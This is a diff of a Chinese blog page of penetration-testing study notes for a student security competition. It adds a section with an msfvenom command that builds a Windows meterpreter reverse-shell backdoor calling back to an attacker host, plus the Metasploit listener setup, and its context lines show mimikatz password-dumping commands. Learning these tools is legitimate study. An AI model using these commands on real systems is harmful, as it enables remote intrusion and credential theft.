@@ -19,7 +19,7 @@
 <meta property="og:site_name" content="GetFlag&#39;s Blog">
 <meta property="og:description" content="最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来 西普杯铁人三项包括  个人环境竞赛(pwn) 企业环境竞赛(综合渗透) 数据分析对抗(wireshark流量分析)  对其他两项涉足比较少，所以打算在综合渗透上深挖">
 <meta property="og:locale" content="cn-zh">
-<meta property="og:updated_time" content="2018-03-19T09:37:20.019Z">
+<meta property="og:updated_time" content="2018-03-19T12:24:16.422Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="综合渗透笔记 (持续更新)">
 <meta name="twitter:description" content="最近学校组织参加西普杯 铁人三项比赛，很久没搞渗透，重新把这一块给拾起来 西普杯铁人三项包括  个人环境竞赛(pwn) 企业环境竞赛(综合渗透) 数据分析对抗(wireshark流量分析)  对其他两项涉足比较少，所以打算在综合渗透上深挖">
@@ -46,7 +46,7 @@
 				<h1 class="site-name"><a href="/" title="GetFlag&#39;s Blog">GetFlag&#39;s Blog</a></h1>
 				<h2 class="blog-motto"></h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -85,16 +85,16 @@
 		<a href="/about" title="GetFlag" target="_blank" itemprop="author">GetFlag</a>
 		
   <p class="article-time">
-    <time datetime="2018-03-19T08:00:03.000Z" itemprop="datePublished"> Published 2018-03-19</time>
+    <time datetime="2018-03-19T08:00:03.000Z" itemprop="datePublished"> 发表于 2018-03-19</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		<div id="toc" class="toc-article">
-			<strong class="toc-title">Contents</strong>
+			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web拿shell"><span class="toc-number">1.</span> <span class="toc-text">web拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入读apache配置文件找网站绝对路径"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入读apache配置文件找网站绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入写shell"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin写shell"><span class="toc-number">1.3.</span> <span class="toc-text">phpMyAdmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cms拿Webshell"><span class="toc-number">2.</span> <span class="toc-text">cms拿Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.1.</span> <span class="toc-text">dedecms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息获取"><span class="toc-number">3.1.</span> <span class="toc-text">信息获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh连接"><span class="toc-number">3.2.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取密码"><span class="toc-number">3.3.</span> <span class="toc-text">读取密码</span></a></li></ol></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web拿shell"><span class="toc-number">1.</span> <span class="toc-text">web拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入读apache配置文件找网站绝对路径"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入读apache配置文件找网站绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入写shell"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin写shell"><span class="toc-number">1.3.</span> <span class="toc-text">phpMyAdmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cms拿Webshell"><span class="toc-number">2.</span> <span class="toc-text">cms拿Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.1.</span> <span class="toc-text">dedecms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息获取"><span class="toc-number">3.1.</span> <span class="toc-text">信息获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh连接"><span class="toc-number">3.2.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取密码"><span class="toc-number">3.3.</span> <span class="toc-text">读取密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali内网渗透"><span class="toc-number">4.</span> <span class="toc-text">kali内网渗透</span></a></li></ol>
 		
 		</div>
 		
@@ -139,6 +139,24 @@ dsquery subnet  //查看域IP范围
 </code></pre><h3 id="读取密码"><a href="#读取密码" class="headerlink" title="读取密码"></a>读取密码</h3><p>mimikatz</p>
 <pre><code>privilege::debug //提权
 sekurlsa::logonpasswords //读取密码
+</code></pre><h2 id="kali内网渗透"><a href="#kali内网渗透" class="headerlink" title="kali内网渗透"></a>kali内网渗透</h2><p>###kali生成后门</p>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=88
+-f xxx -o shell.xxx
+</code></pre><p>参数详解：</p>
+<ul>
+<li>p payload名称        使用 -l 参数参看可用的payload</li>
+<li>LHOST 攻击机地址</li>
+<li>LPORT 攻击机监听端口</li>
+<li>f       生成的文件类型  使用 –help-formats 参数参看可以生成的文件类型</li>
+<li>o     生成的文件名</li>
+</ul>
+<p>Metasploit监听</p>
+<pre><code>msfconsole
+use exploit/multi/handler   //使用模块
+set payload windows/meterpreter/reverse_tcp  //设置攻击荷载
+set lhost x.x.x.x      //攻击机本地ip地址
+set lport 88           //攻击机本地端口
+run  //进行监听
 </code></pre>  
 	</div>
 		<footer class="article-footer clearfix">
@@ -190,17 +208,17 @@ sekurlsa::logonpasswords //读取密码
 
 
 </div>  
-      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
   <div id="toc" class="toc-aside">
-  <strong class="toc-title">Contents</strong>
+  <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web拿shell"><span class="toc-number">1.</span> <span class="toc-text">web拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入读apache配置文件找网站绝对路径"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入读apache配置文件找网站绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入写shell"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin写shell"><span class="toc-number">1.3.</span> <span class="toc-text">phpMyAdmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cms拿Webshell"><span class="toc-number">2.</span> <span class="toc-text">cms拿Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.1.</span> <span class="toc-text">dedecms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息获取"><span class="toc-number">3.1.</span> <span class="toc-text">信息获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh连接"><span class="toc-number">3.2.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取密码"><span class="toc-number">3.3.</span> <span class="toc-text">读取密码</span></a></li></ol></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web拿shell"><span class="toc-number">1.</span> <span class="toc-text">web拿shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入读apache配置文件找网站绝对路径"><span class="toc-number">1.1.</span> <span class="toc-text">SQL注入读apache配置文件找网站绝对路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入写shell"><span class="toc-number">1.2.</span> <span class="toc-text">SQL注入写shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpMyAdmin写shell"><span class="toc-number">1.3.</span> <span class="toc-text">phpMyAdmin写shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cms拿Webshell"><span class="toc-number">2.</span> <span class="toc-text">cms拿Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dedecms"><span class="toc-number">2.1.</span> <span class="toc-text">dedecms</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内网渗透"><span class="toc-number">3.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#信息获取"><span class="toc-number">3.1.</span> <span class="toc-text">信息获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh连接"><span class="toc-number">3.2.</span> <span class="toc-text">ssh连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#读取密码"><span class="toc-number">3.3.</span> <span class="toc-text">读取密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kali内网渗透"><span class="toc-number">4.</span> <span class="toc-text">kali内网渗透</span></a></li></ol>
  
   </div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
 <aside class="clearfix">
 
   
@@ -226,10 +244,6 @@ sekurlsa::logonpasswords //读取密码
 		<ul class="clearfix">
 		
 			
-				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
-			
-		
-			
 				<li><a href="/tags/AWD/" title="AWD">AWD<sup>1</sup></a></li>
 			
 		
@@ -242,11 +256,11 @@ sekurlsa::logonpasswords //读取密码
 			
 		
 			
-				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
 			
 		
 			
@@ -258,11 +272,15 @@ sekurlsa::logonpasswords //读取密码
 			
 		
 			
-				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+				<li><a href="/tags/XAMPP/" title="XAMPP">XAMPP<sup>1</sup></a></li>
 			
 		
 			
-				<li><a href="/tags/pdo/" title="pdo">pdo<sup>1</sup></a></li>
+				<li><a href="/tags/error/" title="error">error<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Wireshark/" title="Wireshark">Wireshark<sup>1</sup></a></li>
 			
 		
 		</ul>
@@ -493,7 +511,7 @@ $(document).ready(function(){
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
